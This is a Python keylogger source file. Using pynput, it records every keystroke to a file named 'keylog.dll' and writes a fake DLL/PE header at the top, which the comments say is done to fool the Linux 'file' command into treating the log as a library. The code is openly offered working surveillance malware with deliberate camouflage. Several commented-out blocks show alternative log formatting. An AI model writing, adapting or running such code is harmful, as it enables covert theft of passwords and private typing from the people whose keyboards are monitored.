from pynput.keyboard import Key, Listener
import logging
import os


'''
def on_press(key):
  k = '{0}'.format(key)
  if k[0] == '\'':
    k = k[1:-1]
  elif k == 'Key.space':
    k = ' '
  elif k == 'Key.enter':
    k = '\n'
  else:
    k = '[%s]\n'
   
  if key == Key.esc:
    # Stop listener
    return False

  f.write(k)
  print(k) 
'''

def on_press(key):	
  #log the key you pressed to log tmp file
  try: 
    logging.info(key.char) # letters, numbers etc

  except:
    logging.info(key.name) # other keys

 

  '''
  #read log tmp file 
  f = open('keylog', 'r', encoding='latin-1')
  tmp = f.read().split()
  f.close()
  res = ''
  for i in tmp:
    if i == 'space':
      i = ' '
    elif i == 'enter':
      i = '\n'
    elif len(i) > 1:
      i = '[%s]\n'%i
    res = '%s%s'%(res, i)
  res = '%s%s'%(res, '\n')
  print(res)
  f = open('klog.dll', 'w')
  f.write(res)
  f.close()
  '''
  if key == Key.esc:
    # Stop listener
    return False
 
##dll magic number header '\x4D\x5A\x90'
##we put it the dll magic number header on the top of log file to camouflage the log file with dll file (it can cheat the 'file' command in linux)
header = b'\x4D\x5A\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
log = 'keylog.dll'#log tmp file(for logging library)
#txt = 'klog.dll'  #human readable log txt file

'''
#header lehgth == 48
#check the first 48 bytes of file if it equal the correct dll header, if not we remove it and create a new one with dll header 
f = open(txt, 'wb')
f.close()
f = open(txt, 'rb')
head = f.read()[:48]
f.close()
if head != header:
  os.remove(txt)
  f = open(txt, 'wb')
  f.write(header)
  f.close()
'''
  
#header lehgth == 48
#check the first 48 bytes of file if it equal the correct dll header, if not we remove it and create a new one with dll header 
f = open(log, 'wb')
f.close()
f = open(log, 'rb')
head = f.read()[:48]
f.close()
if head != header:
  os.remove(log)
  f = open(log, 'wb')
  f.write(header)
  f.close()

logging.basicConfig(filename=log, level=logging.DEBUG, format='%(message)s')



# Collect events until released 
with Listener(on_press=on_press,) as listener:
  listener.join()
  

  

'''
 RKGNRKGNKLN JEBFEJKB JEFBEBFEB
 WKF
 DSKLSDBG
 IGHS  HEBFESF NGSEH
 
 EOGEI
 
'''